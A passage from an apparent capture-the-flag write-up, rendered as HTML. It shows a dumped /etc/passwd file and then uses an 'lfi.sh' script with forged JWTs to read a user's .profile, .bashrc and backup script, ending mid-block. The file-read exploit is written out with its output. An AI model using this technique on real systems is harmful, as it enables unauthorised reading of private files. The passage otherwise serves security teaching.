</span></span><span class=line><span class=cl>gnats❌41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span class=line><span class=cl>nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-network❌100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>messagebus❌102:105::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-timesync❌103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>syslog❌104:111::/home/syslog:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_apt❌105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>tss❌106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span class=line><span class=cl>uuidd❌107:115::/run/uuidd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-oom❌108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>tcpdump❌109:117::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>avahi-autoipd❌110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>usbmux❌111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span class=line><span class=cl>dnsmasq❌112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span></span><span class=line><span class=cl>kernoops❌113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
</span></span><span class=line><span class=cl>avahi❌114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
</span></span><span class=line><span class=cl>cups-pk-helper❌115:122:user <span class=k>for</span> cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
</span></span><span class=line><span class=cl>rtkit❌116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
</span></span><span class=line><span class=cl>whoopsie❌117:124::/nonexistent:/bin/false
</span></span><span class=line><span class=cl>sssd❌118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
</span></span><span class=line><span class=cl>speech-dispatcher❌119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
</span></span><span class=line><span class=cl>nm-openvpn❌120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
</span></span><span class=line><span class=cl>saned❌121:128::/var/lib/saned:/usr/sbin/nologin
</span></span><span class=line><span class=cl>colord❌122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
</span></span><span class=line><span class=cl>geoclue❌123:130::/var/lib/geoclue:/usr/sbin/nologin
</span></span><span class=line><span class=cl>pulse❌124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
</span></span><span class=line><span class=cl>gnome-initial-setup❌125:65534::/run/gnome-initial-setup/:/bin/false
</span></span><span class=line><span class=cl>hplip❌126:7:HPLIP system user,,,:/run/hplip:/bin/false
</span></span><span class=line><span class=cl>gdm❌127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
</span></span><span class=line><span class=cl>bean❌1001:1001:,,,:/home/bean:/bin/bash
</span></span><span class=line><span class=cl>christine❌1002:1002:,,,:/home/christine:/bin/bash
</span></span><span class=line><span class=cl>postfix❌128:136::/var/spool/postfix:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mysql❌129:138:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span class=line><span class=cl>sshd❌130:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_laurel❌999:999::/var/log/laurel:/bin/false
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s filter on users with a valid login shell, by removing those with a shell of <code>/bin/false</code> or <code>/usr/sbin/nologin</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$grep</span> -vE <span class=s1>&#39;/bin/false|/usr/sbin/nologin&#39;</span> users.txt 
</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>bean❌1001:1001:,,,:/home/bean:/bin/bash
</span></span><span class=line><span class=cl>christine❌1002:1002:,,,:/home/christine:/bin/bash
</span></span></code></pre></td></tr></table></div></div><p><code>bean</code> and <code>christine</code> both look interesting. It looks like I can&rsquo;t reach christine&rsquo;s <code>.profile</code> file (or it doesn&rsquo;t exist), but I can read bean&rsquo;s <code>.profile</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> $./lfi.sh /home/bean/.profile
</span></span><span class=line><span class=cl>Sending JWT with curl request: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzU0OTU2OTksInVzZXJuYW1lIjoiLycgL2hvbWUvYmVhbi8ucHJvZmlsZSAnLyJ9.TzLw2s13gwZy-eF-QaosBNv3hd09CCvBl0IEfGePm6A
</span></span><span class=line><span class=cl><span class=c1># ~/.profile: executed by the command interpreter for login shells.</span>
</span></span><span class=line><span class=cl><span class=c1># This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login</span>
</span></span><span class=line><span class=cl><span class=c1># exists.</span>
</span></span><span class=line><span class=cl><span class=c1># see /usr/share/doc/bash/examples/startup-files for examples.</span>
</span></span><span class=line><span class=cl><span class=c1># the files are located in the bash-doc package.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># the default umask is set in /etc/profile; for setting the umask</span>
</span></span><span class=line><span class=cl><span class=c1># for ssh logins, install and configure the libpam-umask package.</span>
</span></span><span class=line><span class=cl><span class=c1>#umask 022</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if running bash</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -n <span class=s2>&#34;</span><span class=nv>$BASH_VERSION</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=c1># include .bashrc if it exists</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> -f <span class=s2>&#34;</span><span class=nv>$HOME</span><span class=s2>/.bashrc&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>	. <span class=s2>&#34;</span><span class=nv>$HOME</span><span class=s2>/.bashrc&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set PATH so it includes user&#39;s private bin if it exists</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -d <span class=s2>&#34;</span><span class=nv>$HOME</span><span class=s2>/bin&#34;</span> <span class=o>]</span> <span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>PATH</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$HOME</span><span class=s2>/bin:</span><span class=nv>$PATH</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set PATH so it includes user&#39;s private bin if it exists</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -d <span class=s2>&#34;</span><span class=nv>$HOME</span><span class=s2>/.local/bin&#34;</span> <span class=o>]</span> <span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>PATH</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$HOME</span><span class=s2>/.local/bin:</span><span class=nv>$PATH</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></td></tr></table></div></div><p>How about bean&rsquo;s <code>.bashrc</code> file located at <code>/home/bean/.bashrc</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$./lfi.sh /home/bean/.bashrc
</span></span><span class=line><span class=cl>Sending JWT with curl request: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzU0OTU3NjMsInVzZXJuYW1lIjoiLycgL2hvbWUvYmVhbi8uYmFzaHJjICcvIn0.WWGbwmemekjTYLr8C6A00xCmO45oz7oNLvKO_BriKd0
</span></span><span class=line><span class=cl><span class=c1># ~/.bashrc: executed by bash(1) for non-login shells.</span>
</span></span><span class=line><span class=cl><span class=c1># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span>
</span></span><span class=line><span class=cl><span class=c1># for examples</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># If not running interactively, don&#39;t do anything</span>
</span></span><span class=line><span class=cl><span class=k>case</span> <span class=nv>$-</span> in
</span></span><span class=line><span class=cl>    *i*<span class=o>)</span> <span class=p>;;</span>
</span></span><span class=line><span class=cl>      *<span class=o>)</span> <span class=k>return</span><span class=p>;;</span>
</span></span><span class=line><span class=cl><span class=k>esac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># don&#39;t put duplicate lines or lines starting with space in the history.</span>
</span></span><span class=line><span class=cl><span class=c1># See bash(1) for more options</span>
</span></span><span class=line><span class=cl><span class=nv>HISTCONTROL</span><span class=o>=</span>ignoreboth
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># append to the history file, don&#39;t overwrite it</span>
</span></span><span class=line><span class=cl><span class=nb>shopt</span> -s histappend
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span>
</span></span><span class=line><span class=cl><span class=nv>HISTSIZE</span><span class=o>=</span><span class=m>1000</span>
</span></span><span class=line><span class=cl><span class=nv>HISTFILESIZE</span><span class=o>=</span><span class=m>2000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># check the window size after each command and, if necessary,</span>
</span></span><span class=line><span class=cl><span class=c1># update the values of LINES and COLUMNS.</span>
</span></span><span class=line><span class=cl><span class=nb>shopt</span> -s checkwinsize
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># If set, the pattern &#34;**&#34; used in a pathname expansion context will</span>
</span></span><span class=line><span class=cl><span class=c1># match all files and zero or more directories and subdirectories.</span>
</span></span><span class=line><span class=cl><span class=c1>#shopt -s globstar</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># make less more friendly for non-text input files, see lesspipe(1)</span>
</span></span><span class=line><span class=cl><span class=o>[</span> -x /usr/bin/lesspipe <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=nb>eval</span> <span class=s2>&#34;</span><span class=k>$(</span><span class=nv>SHELL</span><span class=o>=</span>/bin/sh lesspipe<span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set variable identifying the chroot you work in (used in the prompt below)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -z <span class=s2>&#34;</span><span class=si>${</span><span class=nv>debian_chroot</span><span class=k>:-</span><span class=si>}</span><span class=s2>&#34;</span> <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=o>[</span> -r /etc/debian_chroot <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>debian_chroot</span><span class=o>=</span><span class=k>$(</span>cat /etc/debian_chroot<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set a fancy prompt (non-color, unless we know we &#34;want&#34; color)</span>
</span></span><span class=line><span class=cl><span class=k>case</span> <span class=s2>&#34;</span><span class=nv>$TERM</span><span class=s2>&#34;</span> in
</span></span><span class=line><span class=cl>    xterm-color<span class=p>|</span>*-256color<span class=o>)</span> <span class=nv>color_prompt</span><span class=o>=</span>yes<span class=p>;;</span>
</span></span><span class=line><span class=cl><span class=k>esac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># uncomment for a colored prompt, if the terminal has the capability; turned</span>
</span></span><span class=line><span class=cl><span class=c1># off by default to not distract the user: the focus in a terminal window</span>
</span></span><span class=line><span class=cl><span class=c1># should be on the output of commands, not on the prompt</span>
</span></span><span class=line><span class=cl><span class=c1>#force_color_prompt=yes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -n <span class=s2>&#34;</span><span class=nv>$force_color_prompt</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> -x /usr/bin/tput <span class=o>]</span> <span class=o>&amp;&amp;</span> tput setaf <span class=m>1</span> &gt;<span class=p>&amp;</span>/dev/null<span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>	<span class=c1># We have color support; assume it&#39;s compliant with Ecma-48</span>
</span></span><span class=line><span class=cl>	<span class=c1># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span>
</span></span><span class=line><span class=cl>	<span class=c1># a case would tend to support setf rather than setaf.)</span>
</span></span><span class=line><span class=cl>	<span class=nv>color_prompt</span><span class=o>=</span>yes
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>	<span class=nv>color_prompt</span><span class=o>=</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$color_prompt</span><span class=s2>&#34;</span> <span class=o>=</span> yes <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>PS1</span><span class=o>=</span><span class=s1>&#39;${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=nv>PS1</span><span class=o>=</span><span class=s1>&#39;${debian_chroot:+($debian_chroot)}\u@\h:\w\$ &#39;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=nb>unset</span> color_prompt force_color_prompt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># If this is an xterm set the title to user@host:dir</span>
</span></span><span class=line><span class=cl><span class=k>case</span> <span class=s2>&#34;</span><span class=nv>$TERM</span><span class=s2>&#34;</span> in
</span></span><span class=line><span class=cl>xterm*<span class=p>|</span>rxvt*<span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>PS1</span><span class=o>=</span><span class=s2>&#34;\[\e]0;</span><span class=si>${</span><span class=nv>debian_chroot</span><span class=p>:+(</span><span class=nv>$debian_chroot</span><span class=p>)</span><span class=si>}</span><span class=s2>\u@\h: \w\a\]</span><span class=nv>$PS1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>;;</span>
</span></span><span class=line><span class=cl>*<span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=p>;;</span>
</span></span><span class=line><span class=cl><span class=k>esac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># enable color support of ls and also add handy aliases</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -x /usr/bin/dircolors <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>test</span> -r ~/.dircolors <span class=o>&amp;&amp;</span> <span class=nb>eval</span> <span class=s2>&#34;</span><span class=k>$(</span>dircolors -b ~/.dircolors<span class=k>)</span><span class=s2>&#34;</span> <span class=o>||</span> <span class=nb>eval</span> <span class=s2>&#34;</span><span class=k>$(</span>dircolors -b<span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>alias</span> <span class=nv>ls</span><span class=o>=</span><span class=s1>&#39;ls --color=auto&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1>#alias dir=&#39;dir --color=auto&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1>#alias vdir=&#39;vdir --color=auto&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>alias</span> <span class=nv>grep</span><span class=o>=</span><span class=s1>&#39;grep --color=auto&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>alias</span> <span class=nv>fgrep</span><span class=o>=</span><span class=s1>&#39;fgrep --color=auto&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>alias</span> <span class=nv>egrep</span><span class=o>=</span><span class=s1>&#39;egrep --color=auto&#39;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># colored GCC warnings and errors</span>
</span></span><span class=line><span class=cl><span class=c1>#export GCC_COLORS=&#39;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># some more ls aliases</span>
</span></span><span class=line><span class=cl><span class=nb>alias</span> <span class=nv>ll</span><span class=o>=</span><span class=s1>&#39;ls -alF&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>alias</span> <span class=nv>la</span><span class=o>=</span><span class=s1>&#39;ls -A&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>alias</span> <span class=nv>l</span><span class=o>=</span><span class=s1>&#39;ls -CF&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># custom</span>
</span></span><span class=line><span class=cl><span class=nb>alias</span> <span class=nv>backup_home</span><span class=o>=</span><span class=s1>&#39;/bin/bash /home/bean/Documents/backup_home.sh&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Add an &#34;alert&#34; alias for long running commands.  Use like so:</span>
</span></span><span class=line><span class=cl><span class=c1>#   sleep 10; alert</span>
</span></span><span class=line><span class=cl><span class=nb>alias</span> <span class=nv>alert</span><span class=o>=</span><span class=s1>&#39;notify-send --urgency=low -i &#34;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&#34; &#34;$(history|tail -n1|sed -e &#39;</span><span class=se>\&#39;</span><span class=s1>&#39;s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;)&#34;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Alias definitions.</span>
</span></span><span class=line><span class=cl><span class=c1># You may want to put all your additions into a separate file like</span>
</span></span><span class=line><span class=cl><span class=c1># ~/.bash_aliases, instead of adding them here directly.</span>
</span></span><span class=line><span class=cl><span class=c1># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -f ~/.bash_aliases <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    . ~/.bash_aliases
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># enable programmable completion features (you don&#39;t need to enable</span>
</span></span><span class=line><span class=cl><span class=c1># this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile</span>
</span></span><span class=line><span class=cl><span class=c1># sources /etc/bash.bashrc).</span>
</span></span><span class=line><span class=cl><span class=k>if</span> ! <span class=nb>shopt</span> -oq posix<span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=o>[</span> -f /usr/share/bash-completion/bash_completion <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    . /usr/share/bash-completion/bash_completion
</span></span><span class=line><span class=cl>  <span class=k>elif</span> <span class=o>[</span> -f /etc/bash_completion <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    . /etc/bash_completion
</span></span><span class=line><span class=cl>  <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></td></tr></table></div></div><p>The alias <code>backup_home='/bin/bash /home/bean/Documents/backup_home.sh'</code> looks interesting&mldr; Let&rsquo;s read it!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$./lfi.sh /home/bean/Documents/backup_home.sh
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>mkdir /home/bean/Documents/backup_tmp
</span></span><span class=line><span class=cl><span class=nb>cd</span> /home/bean
</span></span><span class=line><span class=cl>tar --exclude<span class=o>=</span><span class=s1>&#39;.npm&#39;</span> --exclude<span class=o>=</span><span class=s1>&#39;.cache&#39;</span> --exclude<span class=o>=</span><span class=s1>&#39;.vscode&#39;</span> -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
</span></span><span class=line><span class=cl>date &gt; /home/bean/Documents/backup_tmp/time.txt
</span></span><span class=line><span class=cl><span class=nb>cd</span> /home/bean/Documents/backup_tmp
</span></span><span class=line><span class=cl>tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
</span></span><span class=line><span class=cl>rm -r /home/bean/Documents/backup_tmp
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s get this file and gunzip it (note, I added <code>--output -</code> to my lfi.sh script above to capture raw binary):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
